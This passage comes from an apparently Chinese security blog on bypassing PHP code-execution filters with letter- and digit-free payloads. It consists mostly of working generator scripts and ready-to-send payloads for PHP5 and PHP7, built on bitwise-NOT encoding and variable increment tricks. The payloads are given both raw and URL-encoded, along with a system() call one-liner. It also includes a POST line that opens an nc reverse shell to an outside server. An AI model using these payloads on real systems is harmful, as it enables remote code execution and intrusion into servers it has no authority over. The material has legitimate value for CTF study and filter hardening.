class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$result1</span> .= <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;通过在URL内GET方法提交?cmd=\&quot;具体命令\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符串：&quot;</span>.<span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码：&quot;</span>.<span class="variable">$result1</span>;</span><br></pre></td></tr></table></figure>

<h3 id="PHP5-1"><a href="#PHP5-1" class="headerlink" title="PHP5"></a>PHP5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert</span><br><span class="line">字符串：极区区皮十勺</span><br><span class="line">URL编码：%9e%8c%8c%9a%8d%8b</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_POST</span><br><span class="line">字符串：码寸小欠立</span><br><span class="line">URL编码：%a0%af%b0%ac%ab</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_=~(&quot;%9e%8c%8c%9a%8d%8b&quot;);$__=~(&quot;%a0%af%b0%ac%ab&quot;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>

<p>不需要再进行url编码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427211506494.png" alt="image-20250427211506494"></p>
<h3 id="PHP7-1"><a href="#PHP7-1" class="headerlink" title="PHP7"></a>PHP7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_=~(&quot;%a0%af%b0%ac%ab&quot;);$__=$$_;`$__[_]`;</span><br></pre></td></tr></table></figure>

<p>post提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=nc 服务器ip 端口号 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427211921459.png" alt="image-20250427211921459"></p>
<h2 id="0x22无字母数字自增绕过"><a href="#0x22无字母数字自增绕过" class="headerlink" title="0x22无字母数字自增绕过"></a>0x22无字母数字自增绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$cmd2</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;post&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$_ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC2</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$____ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$POC_pat7</span> = <span class="string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$POC_pat7</span>;</span><br><span class="line">    <span class="title function_ invoke__">POC</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd2</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">POC2</span>(<span class="variable">$cmd2</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="PHP5-2"><a href="#PHP5-2" class="headerlink" title="PHP5"></a>PHP5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert($_POST[_]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$$____;$_($__[_]);</span><br></pre></td></tr></table></figure>

<p>urlencode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D%5B%5D.&#x27;&#x27;%3B%24___%3D%24_%5B%24__%5D%3B%24__%3D%24___%3B%24_%3D%24___%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24____%20%3D%20%22_%22%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24%24____%3B%24_(%24__%5B_%5D)%3B</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427213051453.png" alt="image-20250427213051453"></p>
<h3 id="PHP7-2"><a href="#PHP7-2" class="headerlink" title="PHP7"></a>PHP7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$_POST[_]`    $___</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_POST-&gt;</span><br><span class="line">$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427214002561.png" alt="image-20250427214002561"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427214015482.png" alt="image-20250427214015482"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$_POST[_]`</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$_=$$____;`$_`;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$_=$$____;`$_[_]`;</span><br></pre></td></tr></table></figure>

<p>urlencode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D%5B%5D.&#x27;&#x27;%3B%24___%3D%24_%5B%24__%5D%3B%24__%3D%24___%3B%24_%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20%3D%20%22_%22%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24_%3D%24%24____%3B%60%24_%5B_%5D%60%3B</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427214451152.png" alt="image-20250427214451152"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=(_/_)._;$_=$_[_];$__=++$_;$__=++$_.$__;$_++;$_++;$_=_.$__.++$_.++$_;$$_[_]($$_[__]);</span><br></pre></td></tr></table></figure>

<p>_&#x3D;system&amp;__&#x3D;ls</p>
